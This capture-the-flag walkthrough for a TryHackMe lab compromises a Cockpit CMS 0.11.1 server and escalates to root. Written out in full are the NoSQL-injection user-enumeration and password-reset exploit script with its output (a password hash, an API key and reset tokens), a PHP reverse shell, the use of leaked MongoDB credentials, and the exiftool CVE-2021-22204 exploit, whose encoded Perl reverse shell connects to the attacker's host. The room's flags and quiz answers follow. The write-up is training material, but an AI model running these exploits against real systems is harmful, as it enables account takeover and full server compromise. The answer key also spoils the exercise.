----
This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/af878fdc94fd054dd34b05b7977a6c09.png)

### Task 1  Ready Set Go

 Start Machine

You've identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.

Your mission is to exploit these vulnerabilities and compromise the web server.  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.228.98 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.228.98:80
Open 10.10.228.98:22
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 18:35 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:35
Completed Parallel DNS resolution of 1 host. at 18:35, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:35
Scanning 10.10.228.98 [2 ports]
Discovered open port 22/tcp on 10.10.228.98
Discovered open port 80/tcp on 10.10.228.98
Completed Connect Scan at 18:35, 0.20s elapsed (2 total ports)
Initiating Service scan at 18:35
Scanning 2 services on 10.10.228.98
Completed Service scan at 18:35, 9.64s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.228.98.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 8.46s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 1.11s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.00s elapsed
Nmap scan report for 10.10.228.98
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-13 18:35:30 EDT for 19s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f25f9402325cd298b28a9d982f549e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN
|   256 0af429ed554319e773a7097930a8491b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk=
|   256 2f43ada3d15b648633075d94f9dca401 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.53 seconds


http://10.10.228.98/auth/login?to=/


App.request('/auth/check', {
                    auth : {user:this.refs.user.value, password:this.refs.password.value },
                    csfr : "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
                })

HEADER:ALGORITHM & TOKEN TYPE

{

  "typ": "JWT",

  "alg": "HS256"

}

PAYLOAD:DATA

{

  "csfr": "login"

}

http://10.10.228.98/auth/forgotpassword

view-source:http://10.10.228.98/assets/app/css/style.css?ver=0.11.1

https://www.exploit-db.com/exploits/50185

┌──(witty㉿kali)-[~/Downloads]
└─$ more cockpit_enum.py 
# Exploit Title: Cockpit CMS 0.11.1 - 'Username Enumeration & Password 
Reset' NoSQL Injection 
# Date: 06-08-2021
# Exploit Author: Brian Ombongi
# Vendor Homepage: https://getcockpit.com/
# Version: Cockpit 0.11.1
# Tested on: Ubuntu 16.04.7
# CVE : CVE-2020-35847 & CVE-2020-35848

#!/usr/bin/python3
import json
import re
import requests
import random
import string
import argparse


def usage():
    guide = 'python3 exploit.py -u <target_url> '
    return guide

def arguments():
    parse = argparse.ArgumentParser(usage=usage())
    parse.add_argument('-u', dest='url', help='Site URL e.g http://cock
pit.local', type=str, required=True)
    return parse.parse_args()

def test_connection(url):
	try:
		get = requests.get(url)
		if get.status_code == 200:
			print(f"[+] {url}: is reachable")
		else:
			print(f"{url}: is Not reachable, status_code: {
get.status_code}")
	except requests.exceptions.RequestException as e:
		raise SystemExit(f"{url}: is Not reachable \nErr: {e}")


def enumerate_users(url):
    print("[-] Attempting Username Enumeration (CVE-2020-35846) : \n")
    url = url + "/auth/requestreset"
    headers = {
        "Content-Type": "application/json"
    }
    data= {"user":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("[+] Users Found : " + str(matches))
        return matches
    else:
        print("No users found")

def check_user(usernames):
    user = input("\n[-] Get user details For : ")
    if user not in usernames:
        print("User does not exist...Exiting")
        exit()
    else:
        return user


def reset_tokens(url):
    print("[+] Finding Password reset tokens")
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("\t Tokens Found : " + str(matches))
        return matches
    else:
        print("No tokens found, ")


def user_details(url, token):
    print("[+] Obtaining user information ")
    url = url + "/auth/newpassword"
    headers = {
        "Content-Type": "application/json"
        }
    userAndtoken = {}
    for t in token:
        data= {"token":t}
        req = requests.post(url, data=json.dumps(data), headers=headers
)
        pattern=re.compile(r'(this.user\s*=)([^;]+)', re.I)
        matches = pattern.finditer(req.content.decode('utf-8'))
        for match in matches:
            matches = json.loads(match.group(2))
            if matches:
                print ("-----------------Details--------------------")
                for key, value in matches.items():
                    
                    print("\t", "[*]", key ,":", value)       
            else:
                print("No user information found.")
            user = matches['user']
            token = matches['_reset_token']
            userAndtoken[user] = token
            print("--------------------------------------------")
            continue
    return userAndtoken

def password_reset(url, token, user):
    print("[-] Attempting to reset %s's password:" %user)
    characters = string.ascii_letters + string.digits + string.punctuat
ion 
    password = ''.join(random.choice(characters) for i in range(10))
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":token, "password":password}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    if "success" in req.content.decode('utf-8'):
        print("[+] Password Updated Succesfully!")
        print("[+] The New credentials for %s is: \n \t Username : %s \
n \t Password : %s" % (user, user, password))

def generate_token(url, user):
    url = url + "/auth/requestreset"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"user":user}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    
def confirm_prompt(question: str) -> bool:
    reply = None
    while reply not in ("", "y", "n"):
        reply = input(f"{question} (Y/n): ").lower()
        if reply == "y":
            return True
        elif reply == "n":
            return False
        else:
            return True

def pw_reset_trigger(details, user, url):
    for key in details:
        if key == user:
            password_reset(url, details[key], key)
        else:
            continue



if __name__ == '__main__':
    args = arguments()
    url = args.url
    test_connection(url)
    user = check_user(enumerate_users(url))
    generate_token(url, user)
    tokens = reset_tokens(url)
    details = user_details(url, tokens)
    print("\n")
    b = confirm_prompt("[+] Do you want to reset the passowrd for %s?" 
%user)
    if b:
        pw_reset_trigger(details, user, url)
    else:
        print("Exiting..")
        exit()



┌──(witty㉿kali)-[~/Downloads]
└─$ python3 cockpit_enum.py -u http://10.10.228.98
[+] http://10.10.228.98: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) : 

[+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 cockpit_enum.py -u http://10.10.228.98
[+] http://10.10.228.98: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) : 

[+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']

[-] Get user details For : skidy
[+] Finding Password reset tokens
	 Tokens Found : ['rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23', 'rp-f33c415d5d81323f5edbab4bc504e96364b0804b0484b']
[+] Obtaining user information 
-----------------Details--------------------
	 [*] user : admin
	 [*] name : Admin
	 [*] email : admin@yourdomain.de
	 [*] active : True
	 [*] group : admin
	 [*] password : $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
	 [*] i18n : en
	 [*] _created : 1621655201
	 [*] _modified : 1621655201
	 [*] _id : 60a87ea165343539ee000300
	 [*] _reset_token : rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
	 [*] md5email : a11eea8bf873a483db461bb169beccec
--------------------------------------------
-----------------Details--------------------
	 [*] user : skidy
	 [*] email : skidy@tryhackme.fakemail
	 [*] active : True
	 [*] group : admin
	 [*] i18n : en
	 [*] api_key : account-21ca3cfc400e3e565cfcb0e3f6b96d
	 [*] password : $2y$10$uiZPeUQNErlnYxbI5PsnLurWgvhOCW2LbPovpL05XTWY.jCUave6S
	 [*] name : Skidy
	 [*] _modified : 1621719311
	 [*] _created : 1621719311
	 [*] _id : 60a9790f393037a2e400006a
	 [*] _reset_token : rp-f33c415d5d81323f5edbab4bc504e96364b0804b0484b
	 [*] md5email : 5dfac21f8549f298b8ee60e4b90c0e66
--------------------------------------------

[+] Do you want to reset the passowrd for skidy? (Y/n): Y
[-] Attempting to reset skidy's password:
[+] Password Updated Succesfully!
[+] The New credentials for skidy is: 
 	 Username : skidy 
 	 Password : exNQH:>tXd

login

http://10.10.228.98/finder

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>   

http://10.10.228.98/payload_ivan.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 1337                                       
listening on [any] 1337 ...
10.10.228.98: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.228.98] 56084
SOCKET: Shell has connected! PID: 1034
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@ubuntu:/var/www/html/cockpit$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
stux
www-data@ubuntu:/home$ cd stux
cd stux
www-data@ubuntu:/home/stux$ ls
ls
user.txt
www-data@ubuntu:/home/stux$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@ubuntu:/home/stux$ cd /var/www/html/cockpit
cd /var/www/html/cockpit
www-data@ubuntu:/var/www/html/cockpit$ ls
ls
CONTRIBUTING.md  addons		cp	     lib	       storage
Dockerfile	 assets		favicon.png  modules	       webflag.php
LICENSE		 bootstrap.php	index.php    package.json
README.md	 composer.json	install      payload_ivan.php
www-data@ubuntu:/var/www/html/cockpit$ cat webflag.php
cat webflag.php
<?php
        $flag = "thm{f158bea70731c48b05657a02aaf955626d78e9fb}";
?>

www-data@ubuntu:/var/www/html/cockpit$ netstat -tulpn
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -      

MongoDB runs on port 27017 by default

www-data@ubuntu:/home/stux$ ls -la
ls -la
total 44
drwxr-xr-x 4 stux stux 4096 May 22  2021 .
drwxr-xr-x 3 root root 4096 May 21  2021 ..
-rw-r--r-- 1 root root   74 May 22  2021 .bash_history
-rw-r--r-- 1 stux stux  220 May 21  2021 .bash_logout
-rw-r--r-- 1 stux stux 3771 May 21  2021 .bashrc
drwx------ 2 stux stux 4096 May 21  2021 .cache
-rw-r--r-- 1 root root  429 May 21  2021 .dbshell
-rwxrwxrwx 1 root root    0 May 21  2021 .mongorc.js
drwxrwxr-x 2 stux stux 4096 May 21  2021 .nano
-rw-r--r-- 1 stux stux  655 May 21  2021 .profile
-rw-r--r-- 1 stux stux    0 May 21  2021 .sudo_as_admin_successful
-rw-r--r-- 1 root root  312 May 21  2021 .wget-hsts
-rw------- 1 stux stux   46 May 22  2021 user.txt
www-data@ubuntu:/home/stux$ cat .dbshell
cat .dbshell
show
show dbs
use admin
use sudousersbak
show dbs
db.user.insert({name: "stux", name: "p4ssw0rdhack3d!123"})
show dbs
use sudousersbak
show collections
db
show
db.collectionName.find()
show collections
db.collection_name.find().pretty()
db.user.find().pretty()
db.user.insert({name: "stux"})
db.user.find().pretty()
db.flag.insert({name: "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}"})
show collections
db.flag.find().pretty()


www-data@ubuntu:/home/stux$ mongo
mongo
MongoDB shell version: 2.6.10
connecting to: test
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	http://docs.mongodb.org/
Questions? Try the support group
	http://groups.google.com/group/mongodb-user
2023-07-13T16:08:45.840-0700 In File::open(), ::open for '' failed with errno:2 No such file or directory
> show dbs
shshow dbs
admin         (empty)
local         0.078GB
sudousersbak  0.078GB
> use sudousersbak
ususe sudousersbak
switched to db sudousersbak
> show collections
shshow collections
flag
system.indexes
user
> db.user.find()
dbdb.user.find()
{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "p4ssw0rdhack3d!123" }
{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
> db.flag.find()
dbdb.flag.find()
{ "_id" : ObjectId("60a89f3aaadffb0ea68915fb"), "name" : "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}" }

www-data@ubuntu:/home/stux$ su stux
su stux
Password: p4ssw0rdhack3d!123

stux@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool

stux@ubuntu:~$ ls
ls
user.txt
stux@ubuntu:~$ cat user.txt
cat user.txt
thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}

https://github.com/convisolabs/CVE-2021-22204-exiftool

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
Cloning into 'CVE-2021-22204-exiftool'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (25/25), done.
remote: Total 27 (delta 6), reused 17 (delta 2), pack-reused 0
Receiving objects: 100% (27/27), 52.53 KiB | 2.50 MiB/s, done.
Resolving deltas: 100% (6/6), done.
                                                    
┌──(witty㉿kali)-[~/Downloads]
└─$ cd CVE-2021-22204-exiftool 
                                                    
┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ ls
configfile  exploit.py  image.jpg  lab  README.md
                                                    
┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ cat exploit.py            
#!/bin/env python3

import base64
import subprocess

ip = '10.8.19.103'
port = '9090'

payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"


payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )

payload = payload + b"'))};\")"


payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()


subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg']) 

┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ python3 exploit.py
    1 image files updated
                                                                                       
┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ ls
configfile    exploit.py  image.jpg_original  payload      README.md
exploit.djvu  image.jpg   lab                 payload.bzz

┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ rlwrap nc -lvp 9090
listening on [any] 9090 ...

┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...

stux@ubuntu:/tmp$ wget http://10.8.19.103:1234/exploit.djvu
wget http://10.8.19.103:1234/exploit.djvu
--2023-07-13 16:25:11--  http://10.8.19.103:1234/exploit.djvu
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 338 [image/vnd.djvu]
Saving to: ‘exploit.djvu’

exploit.djvu          0%[                    ]       0  --.-KB/s              exploit.djvu        100%[===================>]     338  --.-KB/s    in 0s      

2023-07-13 16:25:12 (51.4 MB/s) - ‘exploit.djvu’ saved [338/338]

stux@ubuntu:/tmp$ sudo /usr/local/bin/exiftool exploit.djvu
sudo /usr/local/bin/exiftool exploit.djvu

┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ rlwrap nc -lvp 9090
listening on [any] 9090 ...
10.10.228.98: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.228.98] 33694
# cd /root
# ls
root.txt
# cat root.txt
thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}


```

What is the name of the Content Management System (CMS) installed on the server?

*Cockpit*

What is the version of the Content Management System (CMS) installed on the server?  

*0.11.1*

What is the path that allow user enumeration?  

*/auth/check*

How many users can you identify when you reproduce the user enumeration attack?

*4*

What is the path that allows you to change user account passwords?  

*/auth/resetpassword*

Compromise the Content Management System (CMS). What is Skidy's email.  

	*skidy@tryhackme.fakemail*

What is the web flag?  

*thm{f158bea70731c48b05657a02aaf955626d78e9fb}*

Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?  

Contains more secrets

*thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}*

What is the user.txt flag?

*thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}*

What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000-0000  

*CVE-2021-22204*

What is the utility used to create the PoC file?  

*djvumake*

Escalate your privileges. What is the flag in root.txt?

*thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}*


[[The Server From Hell]]